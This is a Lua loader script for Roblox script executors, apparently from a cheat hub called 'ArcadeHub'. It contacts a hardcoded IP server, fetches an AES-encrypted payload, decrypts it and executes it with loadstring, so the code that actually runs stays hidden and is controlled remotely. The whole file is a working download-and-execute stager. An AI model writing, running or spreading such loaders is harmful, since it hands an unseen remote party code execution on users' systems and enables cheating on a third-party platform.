local VPS_HOST = "http://103.176.79.8:3000" 

local HttpService = game:GetService("HttpService")
local placeId = tostring(game.PlaceId)

local bootstrapEndpoint = VPS_HOST .. "/api/v2/bootstrap"
local payloadEndpoint   = VPS_HOST .. "/api/v2/payload/"

local function hexToBytes(hex)
    local bytes = {}
    for i = 1, #hex, 2 do
        table.insert(bytes, string.char(tonumber(hex:sub(i, i + 1), 16)))
    end
    return table.concat(bytes)
end

local function decryptPayload(cipherText, key, iv)
    if typeof(crypt) == "table" then
        if typeof(crypt.decrypt) == "function" then
            local ok, res = pcall(function() return crypt.decrypt("aes-cbc", cipherText, key, iv) end)
            if ok and res then return res end
        end
        if typeof(crypt.aes) == "table" and typeof(crypt.aes.decrypt) == "function" then
            local ok, res = pcall(function() return crypt.aes.decrypt(cipherText, key, iv, "cbc") end)
            if ok and res then return res end
        end
    end
    if typeof(syn) == "table" and typeof(syn.crypt) == "table" and typeof(syn.crypt.decrypt) == "function" then
        local ok, res = pcall(function() return syn.crypt.decrypt("aes-cbc", cipherText, key, iv) end)
        if ok and res then return res end
    end
    return cipherText
end

local function customFetch(url)
    local reqFunc = (syn and syn.request) or (http and http.request) or request or http_request
    if reqFunc then
        local res = reqFunc({
            Url = url,
            Method = "GET"
        })
        if res and (res.StatusCode == 200 or res.Status == 200) then
            return res.Body
        end
    end

    local ok, body = pcall(function()
        return game:HttpGet(url)
    end)
    if ok and body then
        return body
    end

    return nil
end

local requestPayload = HttpService:JSONEncode({
    placeId = placeId,
    timestamp = os.time() * 1000,
    nonce = tostring(math.random(100000, 999999))
})

local reqFunc = (syn and syn.request) or (http and http.request) or request or http_request
local rawBootstrapResponse

if reqFunc then
    local res = reqFunc({
        Url = bootstrapEndpoint,
        Method = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body = requestPayload
    })
    if res and (res.StatusCode == 200 or res.Status == 200) then
        responseBody = res.Body
        rawBootstrapResponse = res.Body
    end
else
    local ok, res = pcall(function()
        return game:HttpPost(bootstrapEndpoint, requestPayload, true)
    end)
    if ok then rawBootstrapResponse = res end
end

if not rawBootstrapResponse then
    warn("[ArcadeHub Bootstrap Error] Handshake failed or server unreachable!")
    return
end

local bootstrapData = HttpService:JSONDecode(rawBootstrapResponse)
if not bootstrapData or not bootstrapData.token or not bootstrapData.keyPackage then
    warn("[ArcadeHub Bootstrap Error] Invalid server response payload!")
    return
end

local keyPackageBytes = hexToBytes(bootstrapData.keyPackage)
local sessionKey = keyPackageBytes:sub(1, 32)
local sessionIv  = keyPackageBytes:sub(33, 48)
local sessionToken = bootstrapData.token

local targetPayloadUrl = payloadEndpoint .. sessionToken
local encryptedBuffer = customFetch(targetPayloadUrl)

if not encryptedBuffer then
    warn("[ArcadeHub Delivery Error] Failed to fetch session payload! (Token expired or network blocked)")
    return
end

local decryptedLua = decryptPayload(encryptedBuffer, sessionKey, sessionIv)

if typeof(decompress) == "function" then
    local ok, decomp = pcall(function() return decompress(decryptedLua) end)
    if ok and decomp then decryptedLua = decomp end
end

local func, err = loadstring(decryptedLua)
if func then
    func()
else
    warn("[ArcadeHub Execution Error] Script loadstring failed: " .. tostring(err))
end
